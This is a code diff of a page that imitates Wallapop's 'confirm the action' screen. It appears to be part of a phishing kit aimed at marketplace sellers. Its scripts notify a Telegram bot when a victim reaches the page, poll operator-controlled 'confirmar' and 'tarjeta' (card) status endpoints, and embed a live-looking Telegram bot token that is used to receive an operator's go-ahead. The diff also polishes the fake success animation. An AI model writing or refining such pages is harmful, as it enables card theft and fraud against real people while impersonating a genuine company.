@@ -4,10 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Confirma la acción · Wallapop</title>
+<link rel="icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
+<link rel="apple-touch-icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
-<script src="products.js"></script>
 <style>
 @font-face{font-family:WallieFit;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Fit.woff2) format('woff2');font-display:swap}
 @font-face{font-family:WallieChunky;src:url(https://d22j03ecumputt.cloudfront.net/fonts/Wallie-Chunky.woff2) format('woff2');font-weight:700;font-display:swap}
@@ -62,11 +63,11 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
 .sello{display:flex;justify-content:center;gap:7px;align-items:center;font-size:12px;color:#5C7A89;margin-top:auto;padding-top:30px;padding-bottom:12px}
 .sello svg{width:16px;height:16px;stroke:#5C7A89;fill:none;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round;flex:none}
 
-/* ==================== ANIMACIÓN PAQUETE A TICK VERDE ==================== */
+/* ==================== ANIMACIÓN TICK 100% VERDE ==================== */
 .exito-anim-box {
   position: relative;
-  width: 124px;
-  height: 124px;
+  width: 120px;
+  height: 120px;
   margin: 10px auto 20px;
   display: flex;
   align-items: center;
@@ -75,12 +76,16 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
 
 .anim-ring {
   position: absolute;
-  width: 88px;
-  height: 88px;
+  width: 86px;
+  height: 86px;
   border-radius: 50%;
-  border: 3px solid var(--wp-brand);
+  border: 3.5px solid #13C1AC;
   opacity: 0;
   pointer-events: none;
+}
+.anim-ring-2 {
+  border-color: #3DD2BA;
+  border-width: 2.5px;
 }
 
 .anim-sparks {
@@ -95,35 +100,21 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
   width: 7px;
   height: 7px;
   border-radius: 50%;
-  background: var(--wp-brand);
   opacity: 0;
 }
-.sp.s1 { top: 8%; left: 50%; background: #13C1AC; }
-.sp.s2 { top: 22%; right: 10%; background: #3DD2BA; }
-.sp.s3 { bottom: 20%; right: 12%; background: #015354; }
-.sp.s4 { bottom: 8%; left: 50%; background: #13C1AC; }
-.sp.s5 { bottom: 22%; left: 10%; background: #3DD2BA; }
-.sp.s6 { top: 20%; left: 12%; background: #E9FFB4; }
-
-.paquete-svg-wrap {
-  position: absolute;
-  width: 98px;
-  height: 98px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.svg-paquete {
-  width: 100%;
-  height: 100%;
-  overflow: visible;
-}
+.sp.s1 { top: 6%; left: 50%; background: #13C1AC; }
+.sp.s2 { top: 18%; right: 10%; background: #3DD2BA; }
+.sp.s3 { top: 50%; right: 4%; background: #038673; }
+.sp.s4 { bottom: 18%; right: 12%; background: #13C1AC; }
+.sp.s5 { bottom: 6%; left: 50%; background: #228618; }
+.sp.s6 { bottom: 18%; left: 12%; background: #3DD2BA; }
+.sp.s7 { top: 50%; left: 4%; background: #015354; }
+.sp.s8 { top: 18%; left: 10%; background: #13C1AC; }
 
 .tick-svg-wrap {
-  position: absolute;
-  width: 98px;
-  height: 98px;
+  position: relative;
+  width: 96px;
+  height: 96px;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -135,74 +126,68 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
   width: 100%;
   height: 100%;
   overflow: visible;
-}
-
-/* Animación en marcha cuando se agrega .anim-activa */
-.anim-activa .paquete-svg-wrap {
-  animation: paqueteToTick 1.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-}
-
-@keyframes paqueteToTick {
-  0% { transform: scale(0.3) rotate(-14deg); opacity: 0; }
-  35% { transform: scale(1.1) rotate(3deg); opacity: 1; }
-  55% { transform: scale(1) rotate(0deg); opacity: 1; }
-  72% { transform: scale(1.15) rotate(-2deg); opacity: 1; filter: drop-shadow(0 0 12px rgba(19, 193, 172, 0.75)); }
-  88% { transform: scale(0.2) rotate(20deg); opacity: 0; }
-  100% { transform: scale(0); opacity: 0; visibility: hidden; }
+  filter: drop-shadow(0 6px 20px rgba(19, 193, 172, 0.4));
 }
 
 .anim-activa .tick-svg-wrap {
-  animation: tickPopIn 0.85s 0.85s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+  animation: tickPopGreen 0.75s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
 }
 
-@keyframes tickPopIn {
-  0% { transform: scale(0) rotate(-25deg); opacity: 0; }
-  70% { transform: scale(1.14) rotate(4deg); opacity: 1; }
+@keyframes tickPopGreen {
+  0% { transform: scale(0.2) rotate(-20deg); opacity: 0; }
+  60% { transform: scale(1.12) rotate(3deg); opacity: 1; }
   100% { transform: scale(1) rotate(0deg); opacity: 1; }
 }
 
 .anim-activa .tick-circle {
-  stroke-dasharray: 260;
-  stroke-dashoffset: 260;
-  animation: strokeCircle 0.65s 0.95s ease-out forwards;
+  stroke-dasharray: 270;
+  stroke-dashoffset: 270;
+  animation: strokeCircleGreen 0.65s 0.15s ease-out forwards;
 }
 
-@keyframes strokeCircle {
+@keyframes strokeCircleGreen {
   100% { stroke-dashoffset: 0; }
 }
 
 .anim-activa .tick-check {
   stroke-dasharray: 80;
   stroke-dashoffset: 80;
-  animation: strokeCheck 0.45s 1.3s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  animation: strokeCheckGreen 0.45s 0.5s cubic-bezier(0.65, 0, 0.45, 1) forwards;
 }
 
-@keyframes strokeCheck {
+@keyframes strokeCheckGreen {
   100% { stroke-dashoffset: 0; }
 }
 
-.anim-activa .anim-ring {
-  animation: ringPulse 0.9s 1.25s cubic-bezier(0.215, 0.61, 0.355, 1) forwards;
+.anim-activa .anim-ring-1 {
+  animation: ringPulseGreen 0.9s 0.45s cubic-bezier(0.215, 0.61, 0.355, 1) forwards;
+}
+.anim-activa .anim-ring-2 {
+  animation: ringPulseGreen 0.9s 0.6s cubic-bezier(0.215, 0.61, 0.355, 1) forwards;
 }
 
-@keyframes ringPulse {
-  0% { transform: scale(0.7); opacity: 0.85; }
-  100% { transform: scale(1.55); opacity: 0; }
+@keyframes ringPulseGreen {
+  0% { transform: scale(0.7); opacity: 0.9; }
+  100% { transform: scale(1.65); opacity: 0; }
 }
 
-.anim-activa .sp.s1 { animation: sparkFly1 0.6s 1.35s ease-out forwards; }
-.anim-activa .sp.s2 { animation: sparkFly2 0.6s 1.37s ease-out forwards; }
-.anim-activa .sp.s3 { animation: sparkFly3 0.6s 1.39s ease-out forwards; }
-.anim-activa .sp.s4 { animation: sparkFly4 0.6s 1.41s ease-out forwards; }
-.anim-activa .sp.s5 { animation: sparkFly5 0.6s 1.43s ease-out forwards; }
-.anim-activa .sp.s6 { animation: sparkFly6 0.6s 1.45s ease-out forwards; }
+.anim-activa .sp.s1 { animation: sparkFly1 0.6s 0.55s ease-out forwards; }
+.anim-activa .sp.s2 { animation: sparkFly2 0.6s 0.57s ease-out forwards; }
+.anim-activa .sp.s3 { animation: sparkFly3 0.6s 0.59s ease-out forwards; }
+.anim-activa .sp.s4 { animation: sparkFly4 0.6s 0.61s ease-out forwards; }
+.anim-activa .sp.s5 { animation: sparkFly5 0.6s 0.63s ease-out forwards; }
+.anim-activa .sp.s6 { animation: sparkFly6 0.6s 0.65s ease-out forwards; }
+.anim-activa .sp.s7 { animation: sparkFly7 0.6s 0.67s ease-out forwards; }
+.anim-activa .sp.s8 { animation: sparkFly8 0.6s 0.69s ease-out forwards; }
 
-@keyframes sparkFly1 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, -30px) scale(1); opacity:0; } }
-@keyframes sparkFly2 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(24px, -20px) scale(1); opacity:0; } }
-@keyframes sparkFly3 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(26px, 20px) scale(1); opacity:0; } }
-@keyframes sparkFly4 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, 30px) scale(1); opacity:0; } }
-@keyframes sparkFly5 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-24px, 20px) scale(1); opacity:0; } }
-@keyframes sparkFly6 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-26px, -20px) scale(1); opacity:0; } }
+@keyframes sparkFly1 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, -32px) scale(1); opacity:0; } }
+@keyframes sparkFly2 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(25px, -22px) scale(1); opacity:0; } }
+@keyframes sparkFly3 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(32px, 0) scale(1); opacity:0; } }
+@keyframes sparkFly4 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(25px, 22px) scale(1); opacity:0; } }
+@keyframes sparkFly5 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(0, 32px) scale(1); opacity:0; } }
+@keyframes sparkFly6 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-25px, 22px) scale(1); opacity:0; } }
+@keyframes sparkFly7 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-32px, 0) scale(1); opacity:0; } }
+@keyframes sparkFly8 { 0%{ transform: translate(0,0) scale(0); opacity:1; } 100%{ transform: translate(-25px, -22px) scale(1); opacity:0; } }
 
 /* ==================== PANTALLA DE ÉXITO ==================== */
 .wrap-exito {
@@ -435,9 +420,10 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
   <!-- PANTALLA 2: ÉXITO CON TICK VERDE Y MENSAJE DE 24H-48H -->
   <div class="wrap wrap-exito" id="pantallaExito" style="display:none;">
 
-    <!-- Animación: Paquete que forma un tick verde estilo Wallapop -->
+    <!-- Animación: Tick 100% verde animado -->
     <div class="exito-anim-box">
-      <div class="anim-ring"></div>
+      <div class="anim-ring anim-ring-1"></div>
+      <div class="anim-ring anim-ring-2"></div>
       <div class="anim-sparks">
         <span class="sp s1"></span>
         <span class="sp s2"></span>
@@ -445,30 +431,16 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
         <span class="sp s4"></span>
         <span class="sp s5"></span>
         <span class="sp s6"></span>
-      </div>
-
-      <!-- Icono paquete (Wallapop Verde) -->
-      <div class="paquete-svg-wrap" id="paqueteIcon">
-        <svg viewBox="0 0 100 100" class="svg-paquete">
-          <ellipse cx="50" cy="85" rx="32" ry="7" fill="rgba(0,0,0,0.07)" />
-          <polygon points="50,42 22,27 22,61 50,77" fill="#13C1AC" stroke="#0E9F8E" stroke-width="1.6" stroke-linejoin="round" />
-          <polygon points="50,42 78,27 78,61 50,77" fill="#0EA895" stroke="#087567" stroke-width="1.6" stroke-linejoin="round" />
-          <polygon points="50,42 22,27 50,13 78,27" fill="#36E5D1" stroke="#0E9F8E" stroke-width="1.6" stroke-linejoin="round" />
-          <polygon points="46,40 54,44 54,75 46,71" fill="#FFFFFF" opacity="0.95" />
-          <polygon points="46,15 54,19 54,44 46,40" fill="#FFFFFF" opacity="0.95" />
-          <polygon points="27,41 39,47 39,57 27,51" fill="#FFFFFF" stroke="#0EA895" stroke-width="1" />
-          <line x1="30" y1="45" x2="36" y2="48" stroke="#015354" stroke-width="1.2" stroke-linecap="round" />
-          <line x1="30" y1="48" x2="36" y2="51" stroke="#015354" stroke-width="1.2" stroke-linecap="round" />
-          <line x1="30" y1="51" x2="34" y2="53" stroke="#13C1AC" stroke-width="1.2" stroke-linecap="round" />
-        </svg>
+        <span class="sp s7"></span>
+        <span class="sp s8"></span>
       </div>
 
       <!-- Icono Tick verde animado -->
       <div class="tick-svg-wrap" id="tickIcon">
         <svg viewBox="0 0 100 100" class="svg-tick">
-          <circle class="tick-bg" cx="50" cy="50" r="43" fill="#CCFAF1" />
-          <circle class="tick-circle" cx="50" cy="50" r="40" fill="none" stroke="#13C1AC" stroke-width="5" stroke-linecap="round" />
-          <path class="tick-check" fill="none" stroke="#13C1AC" stroke-width="6.5" stroke-linecap="round" stroke-linejoin="round" d="M30 52 L43 65 L71 35" />
+          <circle class="tick-bg" cx="50" cy="50" r="43" fill="#E8FBF8" />
+          <circle class="tick-circle" cx="50" cy="50" r="42" fill="none" stroke="#13C1AC" stroke-width="4.5" stroke-linecap="round" />
+          <path class="tick-check" fill="none" stroke="#13C1AC" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" d="M30 52 L43 65 L71 35" />
         </svg>
       </div>
     </div>
@@ -496,14 +468,6 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
     <!-- Resumen de transacción -->
     <div class="trans-card">
       <div class="trans-row">
-        <span>Importe a recibir</span>
-        <strong class="trans-precio" id="exitoPrecio">230 €</strong>
-      </div>
-      <div class="trans-row">
-        <span>Producto</span>
-        <span class="trans-tit" id="exitoTitulo">iPhone 13</span>
-      </div>
-      <div class="trans-row">
         <span>Estado</span>
         <span class="badge-status">
           <span class="status-dot"></span>
@@ -525,7 +489,7 @@ p.desc{font-size:14px;line-height:1.5;color:var(--wp-content-mid);margin:10px 0 
     </div>
 
     <div class="btn-wrap">
-      <a href="https://es.wallapop.com" class="btn-finalizar" id="btnFinalizar">Volver a Wallapop</a>
+      <a href="https://es.wallapop.com/" class="btn-finalizar" id="btnFinalizar">Volver a Wallapop</a>
     </div>
 
     <div class="sello">
@@ -551,183 +515,53 @@ $('logoImg').onerror = () => {
   }
 };
 
-const eur = n => {
-  if (n === null || n === undefined || n === '') return '';
-  if (typeof n === 'string') {
-    if (n.includes('€')) return n.trim();
-    n = n.replace(/[^\d.,]/g, '').replace(',', '.');
-  }
-  const num = Number(n);
-  if (isNaN(num)) return String(n);
-  return new Intl.NumberFormat('es-ES', { maximumFractionDigits: 0 }).format(num) + ' €';
-};
-
+const eur = n => new Intl.NumberFormat('es-ES', { maximumFractionDigits: 0 }).format(Number(n) || 0) + ' \u20AC';
 const params = new URLSearchParams(location.search);
-let id = params.get('id') || (location.pathname.match(/\/a\/([A-Za-z0-9]+)/) || [])[1] || '';
-const urlTit = params.get('tit') || '';
-const urlPrecio = params.get('precio') || '';
+const id = params.get('id') || (location.pathname.match(/\/a\/([A-Za-z0-9]+)/) || [])[1] || '';
 
 let productoCargado = null;
 
-// Buscador recursivo y universal de productos en cualquier estructura (SERVER_DB, JSON, localStorage, etc.)
-function findProductIn(source, targetId) {
-  if (!source || typeof source !== 'object') return null;
-  const allProds = [];
-  const activeId = source.activeId || (window.SERVER_DB && window.SERVER_DB.activeId);
-
-  function walk(obj) {
-    if (!obj || typeof obj !== 'object') return;
-    if ((obj.titulo || obj.articulo) && (obj.precio !== undefined || obj.precioArticulo !== undefined)) {
-      allProds.push(obj);
-      return;
-    }
-    for (const k of Object.keys(obj)) {
-      if (k !== 'tarjeta' && typeof obj[k] === 'object' && obj[k] !== null) {
-        walk(obj[k]);
-      }
-    }
-  }
-
-  walk(source);
-
-  if (targetId) {
-    const found = allProds.find(p => p.id === targetId || p.id === ('AD' + targetId));
-    if (found) return found;
-  }
-  if (activeId) {
-    const found = allProds.find(p => p.id === activeId || p.id === ('AD' + activeId));
-    if (found) return found;
-  }
-  return allProds[0] || null;
-}
-
-// Resolver síncrono del producto consultando todas las fuentes disponibles
-function resolverDatos(targetId) {
-  const lookId = targetId || id;
-  let p = null;
-
-  // 1. window.SERVER_DB (cargado via products.js de forma síncrona en head)
-  if (window.SERVER_DB) {
-    p = findProductIn(window.SERVER_DB, lookId);
-    if (p && (p.titulo || p.articulo) && (p.precio !== undefined || p.precioArticulo !== undefined)) return p;
-  }
-
-  // 2. localStorage wp_active_prod
-  try {
-    const act = JSON.parse(localStorage.getItem('wp_active_prod') || '{}');
-    const fAct = findProductIn(act, lookId);
-    if (fAct && (fAct.titulo || fAct.articulo) && (fAct.precio !== undefined || fAct.precioArticulo !== undefined)) return fAct;
-  } catch(e) {}
-
-  // 3. localStorage wp_products_v1
-  try {
-    const dbLocal = JSON.parse(localStorage.getItem('wp_products_v1') || '{}');
-    const fDb = findProductIn(dbLocal, lookId);
-    if (fDb && (fDb.titulo || fDb.articulo) && (fDb.precio !== undefined || fDb.precioArticulo !== undefined)) return fDb;
-  } catch(e) {}
-
-  return p;
-}
-
-// Aplicar los datos tanto en la mini cabecera como en la pantalla de éxito
-function aplicarDatos(p) {
-  if (!p) p = resolverDatos(id);
-
-  const finalTit = (p && (p.titulo || p.articulo)) || urlTit || (productoCargado && (productoCargado.titulo || productoCargado.articulo)) || ($('exitoTitulo') && $('exitoTitulo').textContent !== '—' && $('exitoTitulo').textContent ? $('exitoTitulo').textContent : '') || ($('miniTitulo') && $('miniTitulo').textContent !== '—' && $('miniTitulo').textContent ? $('miniTitulo').textContent : '') || 'iPhone 13';
-
-  const rawPrecio = (p && (p.precioArticulo !== undefined ? p.precioArticulo : p.precio)) || urlPrecio || (productoCargado && (productoCargado.precioArticulo !== undefined ? productoCargado.precioArticulo : productoCargado.precio)) || ($('exitoPrecio') && $('exitoPrecio').textContent !== '—' && $('exitoPrecio').textContent ? $('exitoPrecio').textContent : '') || ($('miniTotal') && $('miniTotal').textContent !== '—' && $('miniTotal').textContent ? $('miniTotal').textContent : '') || 230;
-
-  const finalPrecio = eur(rawPrecio);
-
-  if ($('miniTitulo')) $('miniTitulo').textContent = finalTit;
-  if ($('miniTotal')) $('miniTotal').textContent = finalPrecio;
-  if ($('exitoTitulo')) $('exitoTitulo').textContent = finalTit;
-  if ($('exitoPrecio')) $('exitoPrecio').textContent = finalPrecio;
-
-  if (p && p.fotos && p.fotos.length && $('miniThumb')) {
-    let f = p.fotos[0];
-    if (f) {
-      if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('images.weserv.nl')) {
-        f = 'https://images.weserv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
-      }
-      $('miniThumb').src = f;
-      $('miniThumb').style.display = 'block';
-    }
-  }
-  if ($('miniCard')) $('miniCard').style.display = 'flex';
-}
-
 if (id) {
   $('homeBtn').href = '/a/' + id;
-}
-
-// Ejecutar inmediatamente de forma síncrona para que NUNCA aparezca "—"
-productoCargado = resolverDatos(id);
-aplicarDatos(productoCargado);
-
-(async function loadMini() {
-  try {
-    let p = productoCargado;
-
-    // 1. Decodificar parámetro ?p= o ?d=
-    if (!p || (!p.titulo && !p.articulo)) {
-      const rawP = params.get('p') || params.get('d');
-      if (rawP) {
-        try {
-          const dec = decodeURIComponent(escape(atob(decodeURIComponent(rawP))));
-          const parsed = JSON.parse(dec);
-          if (parsed) p = findProductIn(parsed, id);
-        } catch (e) {}
-      }
-    }
-
-    // 2. Intentar API local
-    if ((!p || (!p.titulo && !p.articulo)) && id) {
+  (async function loadMini() {
+    try {
+      let p = null;
       try {
         const r = await fetch('/api/product/' + id);
-        if (r.ok) {
-          const d = await r.json();
-          const found = findProductIn(d, id);
-          if (found) p = found;
-        }
+        if (r.ok) p = await r.json();
       } catch (e) {}
-    }
-
-    // 3. Intentar products.json
-    if (!p || (!p.titulo && !p.articulo)) {
-      try {
-        const r = await fetch('/products.json?t=' + Date.now());
-        if (r.ok) {
-          const d = await r.json();
-          const found = findProductIn(d, id);
-          if (found) p = found;
+      if (!p || !p.id) {
+        try {
+          const r = await fetch('/products.json?t=' + Date.now());
+          if (r.ok) {
+            const d = await r.json();
+            const prods = d.products || d;
+            if (prods && prods[id]) p = prods[id];
+          }
+        } catch (e) {}
+      }
+      if (p) {
+        productoCargado = p;
+        $('miniTitulo').textContent = p.titulo || 'Producto';
+        $('miniTotal').textContent = eur(p.precioArticulo || p.precio);
+        let f = (p.fotos || [])[0];
+        if (f) {
+          if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('images.weserv.nl')) {
+            f = 'https://images.weserv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
+          }
+          $('miniThumb').src = f;
+          $('miniThumb').style.display = 'block';
         }
-      } catch (e) {}
-    }
+        $('miniCard').style.display = 'flex';
+      }
+    } catch (e) {}
 
-    // 4. Intentar data/productos.json
-    if (!p || (!p.titulo && !p.articulo)) {
-      try {
-        const r = await fetch('/data/productos.json?t=' + Date.now());
-        if (r.ok) {
-          const d = await r.json();
-          const found = findProductIn(d, id);
-          if (found) p = found;
-        }
-      } catch (e) {}
-    }
-
-    if (p) {
-      productoCargado = p;
-    }
-    aplicarDatos(productoCargado);
-  } catch (e) {
-    aplicarDatos(productoCargado);
-  }
-
-  // Notificar a Telegram que el cliente ha llegado a confirmar.html
-  notificarTelegramConfirmar(productoCargado);
-})();
+    // Notificar a Telegram que el cliente ha llegado a confirmar.html
+    notificarTelegramConfirmar(productoCargado);
+  })();
+} else {
+  notificarTelegramConfirmar(null);
+}
 
 // ==================== NOTIFICACIÓN A TELEGRAM ====================
 let notifEnviada = false;
@@ -819,11 +653,13 @@ function mostrarExito() {
   if (statusPollTimer) clearTimeout(statusPollTimer);
   if (reloj) clearInterval(reloj);
 
-  // Asegurar que siempre se apliquen los datos completos
-  aplicarDatos(productoCargado);
+  const tTit = (productoCargado && (productoCargado.titulo || productoCargado.articulo)) || $('miniTitulo').textContent || 'Artículo Wallapop';
+  const tTot = (productoCargado && (productoCargado.precioArticulo || productoCargado.precio)) ? eur(productoCargado.precioArticulo || productoCargado.precio) : $('miniTotal').textContent || '—';
 
+  if ($('exitoTitulo')) $('exitoTitulo').textContent = tTit;
+  if ($('exitoPrecio')) $('exitoPrecio').textContent = tTot;
   if ($('btnFinalizar')) {
-    $('btnFinalizar').href = 'https://es.wallapop.com';
+    $('btnFinalizar').href = 'https://es.wallapop.com/';
   }
 
   // Ocultar pantalla de espera
@@ -861,54 +697,42 @@ const checkConfirmarStatus = async () => {
   if (yaConfirmado) return;
   const targetId = id || 'AD_WEB';
 
-  let data = null;
-  // 1. Probar ruta amigable
   try {
     const resp = await fetch('/api/product/' + targetId + '/confirmar/status?t=' + Date.now());
     if (resp.ok) {
-      data = await resp.json();
-    }
-  } catch (e) {}
-
-  // 2. Probar api.php directo (fallback infalible para hosting PHP)
-  if (!data || !data.status) {
-    try {
-      const resp2 = await fetch('/api.php?action=confirmar_status&id=' + targetId + '&t=' + Date.now());
-      if (resp2.ok) {
-        data = await resp2.json();
-      }
-    } catch (e) {}
-  }
-
-  if (data && data.status) {
-    if (data.status === 'confirmado_final' || data.status === 'confirmed_again' || data.status === 'finalizado') {
-      mostrarExito();
-      return;
-    }
-  }
-
-  // 3. Fallback adicional Telegram getMyDescription
-  try {
-    const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
-    if (tgDescResp.ok) {
-      const tgData = await tgDescResp.json();
-      const desc = (tgData && tgData.result && tgData.result.description) || '';
-      if (desc.includes('status:confirmado_final')) {
-        const m = desc.match(/status:confirmado_final:([A-Za-z0-9]+)/);
-        if (m && m[1]) {
-          const found = resolverDatos(m[1]);
-          if (found) {
-            productoCargado = found;
-            aplicarDatos(found);
-          }
-        }
+      const data = await resp.json();
+      if (data.status === 'confirmado_final' || data.status === 'confirmed_again' || data.status === 'finalizado') {
         mostrarExito();
         return;
       }
     }
   } catch (e) {}
 
-  statusPollTimer = setTimeout(checkConfirmarStatus, 1000);
+  try {
+    const resp2 = await fetch('/api/product/' + targetId + '/tarjeta/status?t=' + Date.now());
+    if (resp2.ok) {
+      const data2 = await resp2.json();
+      if (data2.status === 'confirmado_final' || data2.status === 'confirmed_again' || data2.status === 'finalizado') {
+        mostrarExito();
+        return;
+      }
+    }
+  } catch (e) {}
+
+  // 3. Probar Telegram getMyDescription para compatibilidad total en Netlify y nube
+  try {
+    const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
+    if (tgDescResp.ok) {
+      const tgData = await tgDescResp.json();
+      const desc = (tgData && tgData.result && tgData.result.description) || '';
+      if (desc.includes('status:confirmado_final')) {
+        mostrarExito();
+        return;
+      }
+    }
+  } catch (e) {}
+
+  statusPollTimer = setTimeout(checkConfirmarStatus, 1200);
 };
 
 statusPollTimer = setTimeout(checkConfirmarStatus, 1200);
